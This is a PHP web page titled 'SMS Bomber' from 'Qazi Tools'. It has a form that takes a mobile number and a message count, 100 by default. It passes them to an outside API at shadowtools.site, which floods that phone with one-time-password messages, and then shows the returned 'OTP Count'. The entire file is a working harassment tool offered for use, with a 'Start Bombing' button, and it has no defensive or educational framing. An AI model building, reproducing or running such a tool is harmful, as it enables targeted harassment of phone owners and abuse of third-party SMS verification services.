<?php
$responseData = null;
$error = null;

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $number = $_POST['number'] ?? '';
    $amount = $_POST['amount'] ?? 100;

    if (empty($number)) {
        $error = "Mobile number is required.";
    } else {
        $apiUrl = "https://shadowtools.site/smsbomberapi/smsbomber.php?number=" . urlencode($number) . "&amount=" . urlencode($amount);
        $apiResponse = file_get_contents($apiUrl);
        $decoded = json_decode($apiResponse, true);

        if ($decoded && isset($decoded['status'])) {
            $responseData = $decoded;
        } else {
            $responseData = ['raw' => $apiResponse];
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>SMS Bomber | Qazi Tools</title>
    <style>
        body {
            margin: 0;
            background: #0d0d0d;
            font-family: 'Segoe UI', sans-serif;
            color: #fff;
        }
        .header {
            background: #00ffcc;
            color: #000;
            text-align: center;
            padding: 20px;
            font-size: 28px;
            font-weight: bold;
            box-shadow: 0 4px 12px #00ffcc66;
        }
        .container {
            max-width: 500px;
            margin: 40px auto;
            padding: 30px;
            background: #181818;
            border-radius: 15px;
            box-shadow: 0 0 30px #00ffcc33;
        }
        label {
            display: block;
            margin: 15px 0 5px;
        }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: #2e2e2e;
            color: #fff;
            font-size: 16px;
        }
        input[type="submit"] {
            width: 100%;
            margin-top: 20px;
            padding: 12px;
            background: #00ffcc;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            color: #000;
            font-size: 16px;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background: #00ddb3;
        }
        .response-box {
            margin-top: 30px;
            background: #111;
            padding: 20px;
            border-radius: 10px;
            border-left: 5px solid #00ffcc;
            box-shadow: 0 0 15px #00ffcc44;
        }
        .response-box strong {
            color: #00ffcc;
        }
        .error {
            color: red;
            margin-top: 15px;
        }
        .footer {
            margin-top: 40px;
            background: #111;
            color: #00ffcc;
            text-align: center;
            padding: 15px;
            font-size: 15px;
            font-weight: bold;
            box-shadow: 0 -2px 10px #00ffcc44;
        }
    </style>
</head>
<body>

<div class="header">SMS Bomber</div>

<div class="container">
    <form method="POST">
        <label>Mobile Number:</label>
        <input type="text" name="number" placeholder="03XXXXXXXXX" required>

        <label>Amount (Default is 100):</label>
        <input type="number" name="amount" value="100">

        <input type="submit" value="Start Bombing">
    </form>

    <?php if ($error): ?>
        <div class="error"><?= htmlspecialchars($error) ?></div>
    <?php endif; ?>

    <?php if ($responseData): ?>
        <div class="response-box">
            <?php if (isset($responseData['status'])): ?>
                <p><strong>Status:</strong> <?= htmlspecialchars($responseData['status']) ?></p>
                <p><strong>Message:</strong> <?= htmlspecialchars($responseData['message']) ?></p>
                <p><strong>OTP Count:</strong> <?= htmlspecialchars($responseData['otp_count']) ?></p>
            <?php else: ?>
                <pre><?= htmlspecialchars($responseData['raw']) ?></pre>
            <?php endif; ?>
        </div>
    <?php endif; ?>
</div>

<div class="footer">Developed By QAZI</div>

</body>
</html>
